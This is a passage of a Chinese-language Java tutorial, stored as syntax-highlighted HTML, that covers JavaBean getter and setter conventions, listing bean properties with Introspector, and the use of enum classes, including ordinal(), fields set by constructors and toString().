<span class=\"token keyword\">class</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> age<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setName</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">getAge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>age<span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setAge</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> age<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> age<span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>如果读写方法符合以下这种命名规范：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// 读方法:</span>\n<span class=\"token keyword\">public</span> <span class=\"token class-name\">Type</span> <span class=\"token function\">getXyz</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// 写方法:</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setXyz</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Type</span> value<span class=\"token punctuation\">)</span>\n</code></pre></div><p>那么这种<code>class</code>被称为<code>JavaBean</code></p>\n<p>上面的字段是<code>xyz</code>，那么读写方法名分别以<code>get</code>和<code>set</code>开头，并且后接大写字母开头的字段名<code>Xyz</code>，因此两个读写方法名分别是<code>getXyz()</code>和<code>setXyz()</code>。</p>\n<p><code>boolean</code>字段比较特殊，它的读方法一般命名为<code>isXyz()</code>：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// 读方法:</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">isChild</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// 写方法:</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setChild</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">boolean</span> value<span class=\"token punctuation\">)</span>\n</code></pre></div><p>我们通常把一组对应的读方法（<code>getter</code>）和写方法（<code>setter</code>）称为属性（<code>property</code>）。例如，<code>name</code>属性：</p>\n<ul>\n<li>对应的读方法是<code>String getName()</code></li>\n<li>对应的写方法是<code>setName(String)</code></li>\n</ul>\n<p>只有<code>getter</code>的属性称为只读属性（read-only），例如，定义一个age只读属性：</p>\n<ul>\n<li>对应的读方法是<code>int getAge()</code></li>\n<li>无对应的写方法<code>setAge(int)</code></li>\n</ul>\n<p>类似的，只有<code>setter</code>的属性称为只写属性（write-only）。</p>\n<p>很明显，只读属性很常见，只写属性不常见。</p>\n<p>属性只需要定义<code>getter</code>和<code>setter</code>方法，不一定需要对应的字段。例如，<code>child</code>只读属性定义如下：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> age<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setName</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">getAge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>age<span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setAge</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> age<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> age<span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">isChild</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> age <span class=\"token operator\">&lt;=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>可以看出，<code>getter</code>和<code>setter</code>也是一种数据封装的方法。</p>\n<h3>JavaBean的作用</h3>\n<p>JavaBean主要用来传递数据，即把一组数据组合成一个JavaBean便于传输。此外，JavaBean可以方便地被IDE工具分析，生成读写属性的代码，主要用在图形界面的可视化设计中。</p>\n<p>通过IDE，可以快速生成<code>getter</code>和<code>setter</code>。例如，在Eclipse中，先输入以下代码：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> age<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>然后，点击右键，在弹出的菜单中选择“Source”，“Generate Getters and Setters”，在弹出的对话框中选中需要生成<code>getter</code>和<code>setter</code>方法的字段，点击确定即可由IDE自动完成所有方法代码。</p>\n<h3>枚举JavaBean属性</h3>\n<p>要枚举一个JavaBean的所有属性，可以直接使用Java核心库提供的<code>Introspector</code>：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>beans<span class=\"token punctuation\">.</span></span><span class=\"token operator\">*</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">BeanInfo</span> info <span class=\"token operator\">=</span> <span class=\"token class-name\">Introspector</span><span class=\"token punctuation\">.</span><span class=\"token function\">getBeanInfo</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Person</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">PropertyDescriptor</span> pd <span class=\"token operator\">:</span> info<span class=\"token punctuation\">.</span><span class=\"token function\">getPropertyDescriptors</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>pd<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"  \"</span> <span class=\"token operator\">+</span> pd<span class=\"token punctuation\">.</span><span class=\"token function\">getReadMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"  \"</span> <span class=\"token operator\">+</span> pd<span class=\"token punctuation\">.</span><span class=\"token function\">getWriteMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> age<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> name<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setName</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">getAge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> age<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setAge</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> age<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> age<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>运行上述代码，可以列出所有的属性，以及对应的读写方法。注意<code>class</code>属性是从<code>Object</code>继承的<code>getClass()</code>方法带来的。</p>\n<h2>枚举类</h2>\n<h3>enum</h3>\n<p>为了让编译器能自动检查某个值在枚举的集合内，并且，不同用途的枚举需要不同的类型来标记，不能混用，我们可以使用<code>enum</code>来定义枚举类：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// enum</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Weekday</span> day <span class=\"token operator\">=</span> <span class=\"token class-name\">Weekday</span><span class=\"token punctuation\">.</span><span class=\"token constant\">SUN</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>day <span class=\"token operator\">==</span> <span class=\"token class-name\">Weekday</span><span class=\"token punctuation\">.</span><span class=\"token constant\">SAT</span> <span class=\"token operator\">||</span> day <span class=\"token operator\">==</span> <span class=\"token class-name\">Weekday</span><span class=\"token punctuation\">.</span><span class=\"token constant\">SUN</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Work at home!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Work at office!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">enum</span> <span class=\"token class-name\">Weekday</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token constant\">SUN</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">MON</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">TUE</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">WED</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">THU</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">FRI</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">SAT</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>注意到定义枚举类是通过关键字<code>enum</code>实现的，我们只需依次列出枚举的常量名。</p>\n<p>和<code>int</code>定义的常量相比，使用<code>enum</code>定义枚举有如下好处：</p>\n<p>首先，<code>enum</code>常量本身带有类型信息，即<code>Weekday.SUN</code>类型是<code>Weekday</code>，编译器会自动检查出类型错误。例如，下面的语句不可能编译通过：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">int</span> day <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>day <span class=\"token operator\">==</span> <span class=\"token class-name\">Weekday</span><span class=\"token punctuation\">.</span><span class=\"token constant\">SUN</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// Compile error: bad operand types for binary operator '=='</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>其次，不可能引用到非枚举的值，因为无法通过编译。</p>\n<p>最后，不同类型的枚举不能互相比较或者赋值，因为类型不符。例如，不能给一个<code>Weekday</code>枚举类型的变量赋值为<code>Color</code>枚举类型的值：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Weekday</span> x <span class=\"token operator\">=</span> <span class=\"token class-name\">Weekday</span><span class=\"token punctuation\">.</span><span class=\"token constant\">SUN</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ok!</span>\n<span class=\"token class-name\">Weekday</span> y <span class=\"token operator\">=</span> <span class=\"token class-name\">Color</span><span class=\"token punctuation\">.</span><span class=\"token constant\">RED</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// Compile error: incompatible types</span>\n</code></pre></div><p>这就使得编译器可以在编译期自动检查出所有可能的潜在错误。</p>\n<h3>enum的比较</h3>\n<p>使用<code>enum</code>定义的枚举类是一种引用类型。 引用类型比较，要使用<code>equals()</code>方法，如果使用<code>==</code>比较，它比较的是两个引用类型的变量是否是同一个对象。因此，引用类型比较，要始终使用<code>equals()</code>方法，但<code>enum</code>类型可以例外。</p>\n<p>这是因为<code>enum</code>类型的每个常量在JVM中只有一个唯一实例，所以可以直接用<code>==</code>比较：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>day <span class=\"token operator\">==</span> <span class=\"token class-name\">Weekday</span><span class=\"token punctuation\">.</span><span class=\"token constant\">FRI</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// ok!</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>day<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Weekday</span><span class=\"token punctuation\">.</span><span class=\"token constant\">SUN</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// ok, but more code!</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>enum类型</h3>\n<p>通过<code>enum</code>定义的枚举类，和其他的<code>class</code>有什么区别？</p>\n<p>答案是没有任何区别。<code>enum</code>定义的类型就是<code>class</code>，只不过它有以下几个特点：</p>\n<ul>\n<li>定义的<code>enum</code>类型总是继承自<code>java.lang.Enum</code>，且无法被继承；</li>\n<li>只能定义出<code>enum</code>的实例，而无法通过<code>new</code>操作符创建<code>enum</code>的实例；</li>\n<li>定义的每个实例都是引用类型的唯一实例；</li>\n<li>可以将<code>enum</code>类型用于<code>switch</code>语句。</li>\n</ul>\n<h4>name()</h4>\n<p>返回常量名，例如：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> <span class=\"token class-name\">Weekday</span><span class=\"token punctuation\">.</span><span class=\"token constant\">SUN</span><span class=\"token punctuation\">.</span><span class=\"token function\">name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"SUN\"</span>\n</code></pre></div><h4>ordinal()</h4>\n<p>返回定义的常量的顺序，从0开始计数，例如：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">int</span> n <span class=\"token operator\">=</span> <span class=\"token class-name\">Weekday</span><span class=\"token punctuation\">.</span><span class=\"token constant\">MON</span><span class=\"token punctuation\">.</span><span class=\"token function\">ordinal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 1</span>\n</code></pre></div><p>改变枚举常量定义的顺序就会导致<code>ordinal()</code>返回值发生变化。例如：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">enum</span> <span class=\"token class-name\">Weekday</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token constant\">SUN</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">MON</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">TUE</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">WED</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">THU</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">FRI</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">SAT</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>和</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">enum</span> <span class=\"token class-name\">Weekday</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token constant\">MON</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">TUE</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">WED</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">THU</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">FRI</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">SAT</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">SUN</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>的<code>ordinal</code>就是不同的。如果在代码中编写了类似<code>if(x.ordinal()==1)</code>这样的语句，就要保证<code>enum</code>的枚举顺序不能变。新增的常量必须放在最后。</p>\n<p>有些童鞋会想，<code>Weekday</code>的枚举常量如果要和<code>int</code>转换，使用<code>ordinal()</code>不是非常方便？比如这样写：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">String</span> task <span class=\"token operator\">=</span> <span class=\"token class-name\">Weekday</span><span class=\"token punctuation\">.</span><span class=\"token constant\">MON</span><span class=\"token punctuation\">.</span><span class=\"token function\">ordinal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"/ppt\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">saveToFile</span><span class=\"token punctuation\">(</span>task<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>但是，如果不小心修改了枚举的顺序，编译器是无法检查出这种逻辑错误的。要编写健壮的代码，就不要依靠<code>ordinal()</code>的返回值。因为<code>enum</code>本身是<code>class</code>，所以我们可以定义<code>private</code>的构造方法，并且，给每个枚举常量添加字段：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// enum</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Weekday</span> day <span class=\"token operator\">=</span> <span class=\"token class-name\">Weekday</span><span class=\"token punctuation\">.</span><span class=\"token constant\">SUN</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>day<span class=\"token punctuation\">.</span>dayValue <span class=\"token operator\">==</span> <span class=\"token number\">6</span> <span class=\"token operator\">||</span> day<span class=\"token punctuation\">.</span>dayValue <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Work at home!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Work at office!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">enum</span> <span class=\"token class-name\">Weekday</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">MON</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">TUE</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">WED</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">THU</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">FRI</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">SAT</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">SUN</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">int</span> dayValue<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">Weekday</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> dayValue<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>dayValue <span class=\"token operator\">=</span> dayValue<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>这样就无需担心顺序的变化，新增枚举常量时，也需要指定一个<code>int</code>值。</p>\n<p>默认情况下，对枚举常量调用<code>toString()</code>会返回和<code>name()</code>一样的字符串。但是，<code>toString()</code>可以被覆写，而<code>name()</code>则不行。我们可以给<code>Weekday</code>添加<code>toString()</code>方法：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// enum</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Weekday</span> day <span class=\"token operator\">=</span> <span class=\"token class-name\">Weekday</span><span class=\"token punctuation\">.</span><span class=\"token constant\">SUN</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>day<span class=\"token punctuation\">.</span>dayValue <span class=\"token operator\">==</span> <span class=\"token number\">6</span> <span class=\"token operator\">||</span> day<span class=\"token punctuation\">.</span>dayValue <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Today is \"</span> <span class=\"token operator\">+</span> day <span class=\"token operator\">+</span> <span class=\"token string\">\". Work at home!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Today is \"</span> <span class=\"token operator\">+</span> day <span class=\"token operator\">+</span> <span class=\"token string\">\". Work at office!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">enum</span> <span class=\"token class-name\">Weekday</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">MON</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"星期一\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">TUE</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"星期二\"</span><span 